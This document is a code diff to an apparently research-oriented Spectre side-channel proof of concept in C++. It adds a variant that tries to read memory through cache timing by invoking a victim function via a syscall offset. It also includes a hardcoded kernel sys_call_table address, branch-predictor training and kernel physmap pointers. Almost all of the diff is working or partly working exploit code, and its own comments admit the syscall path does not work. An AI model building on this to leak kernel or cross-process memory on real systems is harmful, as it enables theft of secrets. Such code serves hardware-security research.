@@ -6,6 +6,7 @@
 #include <signal.h>
 #include <unistd.h>
 #include <setjmp.h>
+#include <sched.h>
 
 #ifdef __ANDROID_API__
 #include "android_spectre_Spectre.h"
@@ -82,6 +83,7 @@ public:
     static uint8_t ALIGN_CACHE flush_benchmark[CACHE_LINE_SIZE];
 
     for (int i=0; i<test_count; i++) {
+      sched_yield();
       flush(&flush_benchmark);
       miss_times[i] = access_time(&flush_benchmark);
       hit_times[i]  = access_time(&flush_benchmark);
@@ -122,8 +124,32 @@ enum class SpectreVariant  : uint8_t {
   BoundsCheckBypass=1,
   BranchTargetInjection=2,
   RogueDataCacheLoad=4,
+  GioSyscall=8,
   All=7
 };
+
+
+
+static uint8_t* gio_target_ptr;
+static uint8_t* gio_cached_ptr;
+
+static void victim_gio() {
+    uint8_t value = *gio_target_ptr;
+    volatile uint8_t tmp0 = gio_cached_ptr[(value & (1<<0)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp1 = gio_cached_ptr[(value & (1<<1)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp2 = gio_cached_ptr[(value & (1<<2)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp3 = gio_cached_ptr[(value & (1<<3)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp4 = gio_cached_ptr[(value & (1<<4)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp5 = gio_cached_ptr[(value & (1<<5)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp6 = gio_cached_ptr[(value & (1<<6)) * CACHE_LINE_SIZE];
+    volatile uint8_t tmp7 = gio_cached_ptr[(value & (1<<7)) * CACHE_LINE_SIZE];
+}
+
+typedef void syscall_handler_t();
+syscall_handler_t* gio_call_table[] = {
+    &victim_gio
+};
+syscall_handler_t** sys_call_table = (syscall_handler_t**)0xffffffff82400240;     //TODO: Read this from kallsyms
 
 class Spectre {
   LibFlush& libflush;
@@ -178,6 +204,7 @@ public:
     for (int tries = 999; tries > 0; tries--) {
       uint8_t result = 0;
       for (uint8_t mask=1; mask; mask=mask<<1) {
+        sched_yield();
         libflush.flush(&array2[mask * CACHE_LINE_SIZE]);
 
         // --- Probe using variant 1 ---
@@ -205,7 +232,21 @@ public:
           victim_variant3((uint8_t*)target_ptr, mask);
         }
 
+        // --- Probe using gio's syscall ---
+        if ((int)variant & (int)SpectreVariant::GioSyscall) {
+            gio_target_ptr = (uint8_t*)target_ptr;
+            gio_cached_ptr = array2;
 
+            long offset = gio_call_table - sys_call_table;
+//             printf("sys_call_table=%p, gio_syscall_table=%p, offsef=%ld\n", sys_call_table, victim_gio_ptr, offset);
+            for (int i=0; i<10; i++) {
+                int x = nice(0); //No-op syscall to train branch predictor
+            }
+            //victim_gio();
+            syscall(offset); //Should be the same as calling victim_gio(), but in kernel mode. -- FIXME: Doesn't work
+        }
+
+        libflush.is_cache_hit(&array2[0 * CACHE_LINE_SIZE]);
         // --- Check probing result measuring cache timing
         if (libflush.is_cache_hit(&array2[mask * CACHE_LINE_SIZE])) {
           result |= mask;
@@ -243,7 +284,7 @@ public:
     for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
       uint8_t value[2];
       int score[2];
-      readMemoryByte(ptr, SpectreVariant::RogueDataCacheLoad, value, score);
+      readMemoryByte(ptr, SpectreVariant::GioSyscall, value, score);
 
       LOG(
         "Reading at %p... %s: 0x%02X='%c', score=%d",
@@ -332,7 +373,7 @@ int main(int argc, const char** argv) {
 
   LOG("physical address: %p / %p\n", target_ptr, libflush.to_physical(target_ptr));
 //   target_ptr = 0xffff880000000000 + (const char*)libflush.to_physical(target_ptr);
-  target_ptr = 0xffff880000000000 + (const char*)0x397c133f8;
+//   target_ptr = 0xffff880000000000 + (const char*)0x1ff0c0300;
 
   if (argc == 3) {
     sscanf(argv[1], "%p", &target_ptr);
